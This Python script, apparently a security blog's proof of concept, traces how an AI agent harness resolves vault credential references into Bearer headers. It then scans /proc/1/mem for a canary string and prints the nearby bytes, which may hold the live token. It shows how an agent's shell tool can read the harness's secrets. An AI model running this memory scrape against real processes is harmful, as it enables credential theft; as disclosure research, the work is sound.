"""Blog demo -- trace the vault credential resolution call chain.

Reads the harness source code to build the full call chain from
${arn:...} in config -> resolved Bearer in PID 1's heap. Then
optionally searches /proc/1/mem for a specific canary ARN to prove
the resolution happened and the credential is sitting in memory.

Env:
  CANARY_ARN -- (optional) credential provider ARN to search for in
               PID 1's heap. If found, proves the vault resolved it.
               Example: blog-vault-exfil-mcp-cred

Hosted at github.com/nivmorabin/skills/dict-walk/pid1_vault_mechanism.py
"""
import glob
import os
import re
import sys


PKG = '/opt/amazon/lib/python3.10/site-packages'


def section(title):
    print(f'\n{"=" * 60}')
    print(f'  {title}')
    print(f'{"=" * 60}')


def read_file(path):
    try:
        return open(path).read()
    except Exception as e:
        return f'(error: {e})'


def show_function(source, func_name):
    """Extract and print a function definition."""
    lines = source.split('\n')
    start = None
    for i, line in enumerate(lines):
        if f'def {func_name}' in line:
            start = i
            break
    if start is None:
        return False

    # Find end of function
    func_line = lines[start]
    func_indent = len(func_line) - len(func_line.lstrip())
    end = len(lines)
    for i in range(start + 1, len(lines)):
        line = lines[i]
        if line.strip() and not line[0].isspace() and i > start + 1:
            end = i
            break
        if (line.strip() and len(line) - len(line.lstrip()) <= func_indent
                and not line.strip().startswith(('#', '@', ')'))
                and i > start + 1):
            end = i
            break

    for line in lines[start:min(end, start + 40)]:
        print(f'  {line}')
    if end - start > 40:
        print(f'  ... ({end - start - 40} more lines)')
    return True


def grep_callers(pattern, directory):
    """Find all call sites of a pattern across Python files."""
    results = []
    for py_file in sorted(glob.glob(f'{directory}/**/*.py', recursive=True)):
        try:
            content = open(py_file).read()
        except:
            continue
        rel = py_file[len(PKG)+1:]
        for i, line in enumerate(content.split('\n'), 1):
            if pattern in line and f'def {pattern}' not in line and '# ' + pattern not in line:
                results.append((rel, i, line.strip()))
    return results


def main():
    canary_arn = os.environ.get('CANARY_ARN', '')

    section('CALL CHAIN TRACE: ${arn:...} -> Bearer token in heap')
    print('  Goal: trace how a vault ARN reference in harness config')
    print('  becomes a credential sitting in PID 1\'s readable memory.')
    if canary_arn:
        print(f'  Canary: will search heap for "{canary_arn}"')
    print()

    # --- Step 1: The resolution function ---------------------------
    section('STEP 1: resolve_header_references()')
    print('  File: loopy/tools/__init__.py (or tool_provider.py)')
    print()

    tools_source = ''
    for fname in ('__init__.py', 'tool_provider.py'):
        content = read_file(f'{PKG}/loopy/tools/{fname}')
        if 'error' not in content[:10]:
            tools_source += content

    if show_function(tools_source, 'resolve_header_references'):
        pass
    else:
        print('  (function not found)')

    # Also show resolve_credential_arn if it exists
    print()
    if 'resolve_credential_arn' in tools_source:
        print('  --- resolve_credential_arn() ---')
        show_function(tools_source, 'resolve_credential_arn')

    # --- Step 2: Who calls it? (call chain upward) -----------------
    section('STEP 2: Who calls resolve_header_references()?')
    callers = grep_callers('resolve_header_references', f'{PKG}/loopy')
    for rel, lineno, line in callers:
        print(f'  {rel}:{lineno}:  {line}')

    # Show surrounding context of first non-definition caller
    if callers:
        caller_file = callers[0][0]
        caller_line = callers[0][1]
        print()
        print(f'  --- Context in {caller_file} ---')
        full_path = f'{PKG}/{caller_file}'
        src = read_file(full_path)
        if 'error' not in src[:10]:
            lines = src.split('\n')
            start = max(0, caller_line - 8)
            end = min(len(lines), caller_line + 8)
            for j in range(start, end):
                marker = '>>>' if j + 1 == caller_line else '   '
                print(f'  {marker} {j+1:4d}: {lines[j]}')

    # --- Step 3: The Identity SDK (what gets called inside) --------
    section('STEP 3: Identity SDK -- get_api_key()')
    identity_svc = read_file(f'{PKG}/bedrock_agentcore/services/identity.py')
    if 'error' not in identity_svc[:10]:
        show_function(identity_svc, 'get_api_key')
        print()
        show_function(identity_svc, 'get_workload_access_token')

    # --- Step 4: The boto3 call (where the secret comes back) ------
    section('STEP 4: The API call that returns the credential')
    print('  From identity.py above:')
    print('    dp_client.get_resource_api_key(**req)["apiKey"]')
    print()
    print('  This boto3 call hits the AgentCore Identity data plane.')
    print('  The response contains the vault-stored credential as a')
    print('  plain string. It\'s assigned to a Python variable, then')
    print('  substituted into the Authorization header string.')
    print()
    print('  After substitution, the credential lives in:')
    print('    1. The return value of resolve_header_references() (dict)')
    print('    2. The httpx request object (Authorization header)')
    print('    3. Any Python string interning / gc-surviving references')
    print()
    print('  All three are in PID 1\'s heap. All three are readable')
    print('  via /proc/1/mem from the shell tool.')

    # --- Step 5: Canary verification ------------------------------
    if canary_arn:
        section(f'STEP 5: CANARY SEARCH -- "{canary_arn}" in /proc/1/mem')
        print(f'  Searching PID 1\'s memory for the credential provider name...')
        print()

        canary_bytes = canary_arn.encode('utf-8')
        regions = []
        for line in open('/proc/1/maps').readlines():
            parts = line.split()
            if len(parts) < 2 or 'r' not in parts[1]:
                continue
            try:
                start_s, end_s = parts[0].split('-')
                lo, hi = int(start_s, 16), int(end_s, 16)
                if 4096 <= hi - lo <= 50 * 1024 * 1024:
                    regions.append((lo, hi))
            except:
                continue

        hits = []
        with open('/proc/1/mem', 'rb') as mem:
            for lo, hi in regions:
                try:
                    mem.seek(lo)
                    chunk = mem.read(hi - lo)
                except (OSError, OverflowError):
                    continue
                idx = -1
                while True:
                    idx = chunk.find(canary_bytes, idx + 1)
                    if idx < 0:
                        break
                    addr = lo + idx
                    # Show surrounding context (printable ASCII only)
                    ctx_start = max(0, idx - 20)
                    ctx_end = min(len(chunk), idx + len(canary_bytes) + 60)
                    raw_ctx = chunk[ctx_start:ctx_end]
                    # Replace non-printable with dots
                    context = ''.join(chr(b) if 32 <= b < 127 else '.' for b in raw_ctx)
                    hits.append((addr, context))

        print(f'  Canary hits: {len(hits)}')
        print()
        for i, (addr, ctx) in enumerate(hits[:8]):
            print(f'  [{i}] addr={hex(addr)}')
            print(f'      ...{ctx}...')
            print()

        if hits:
            # Check if we also find "Bearer" near any of these
            bearer_near = sum(1 for _, ctx in hits if 'Bearer' in ctx or 'bearer' in ctx)
            print(f'  Hits with "Bearer" in context: {bearer_near}')
            print()
            print(f'  [+] The credential provider ARN "{canary_arn}" is in PID 1\'s heap.')
            print(f'  [+] resolve_header_references() resolved it at invoke time.')
            if bearer_near:
                print(f'  [+] Found alongside "Bearer" -- the resolved token is right there.')
        else:
            print(f'  X Canary not found. Run Cell 2 (sanity check) first to trigger')
            print(f'    a legitimate MCP call that resolves the vault reference.')

    # --- Summary --------------------------------------------------
    section('COMPLETE CALL CHAIN')
    print()
    print('  create_harness(tools=[{headers: {"Authorization": "Bearer ${arn:...}"}}])')
    print('       |')
    print('       |  at invoke time, when MCP tool is called:')
    print('       v')
    print('  tool_provider.py -> resolve_header_references(headers, identity_client)')
    print('       |')
    print('       |  regex: \\${(arn:...)} -> resolve_credential_arn(arn)')
    print('       v')
    print('  identity_client.get_api_key(provider_name, workload_token)')
    print('       |')
    print('       |  boto3: dp_client.get_resource_api_key()["apiKey"]')
    print('       v')
    print('  returns plain string -> replaces ${arn:...} in header value')
    print('       |')
    print('       |  httpx sends: Authorization: Bearer <actual_credential>')
    print('       v')
    print('  credential bytes live in PID 1 heap (httpx buf + Python str)')
    print('       |')
    print('       |  shell tool: open("/proc/1/mem", "rb").read()')
    print('       v')
    print('  ATTACKER HAS THE CREDENTIAL')
    print()
    print('  ---------------------------------------------------------')
    print('  The credential is NEVER:')
    print('    X Encrypted in memory')
    print('    X Isolated in a separate address space')
    print('    X Zeroed after use')
    print('    X Protected from same-UID /proc/pid/mem reads')
    print()
    print('  The vault protects at-rest and in-transit.')
    print('  It provides ZERO in-use protection.')

    section('DONE')


if __name__ == '__main__':
    main()
